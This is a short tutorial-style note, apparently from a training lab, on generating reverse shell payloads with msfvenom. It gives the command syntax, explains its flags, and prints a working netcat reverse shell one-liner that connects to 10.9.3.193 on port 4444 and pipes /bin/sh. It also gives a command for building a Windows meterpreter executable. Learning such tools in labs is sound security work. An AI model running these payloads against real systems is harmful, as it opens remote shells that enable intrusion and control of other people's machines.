Msfvenom

We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:
"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"

-p = payload
lhost = our local host IP address (this is your machine's IP address)
lport = the port to listen on (this is the port on your machine)
R = export the payload in raw format

Below what was generated:

Payload size: 96 bytes
mkfifo /tmp/tnhkhx; nc 10.9.3.193 4444 0</tmp/tnhkhx | /bin/sh >/tmp/tnhkhx 2>&1; rm /tmp/tnhkhx
 

msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe - this will generate a basic windows meterpreter reverse tcp shell
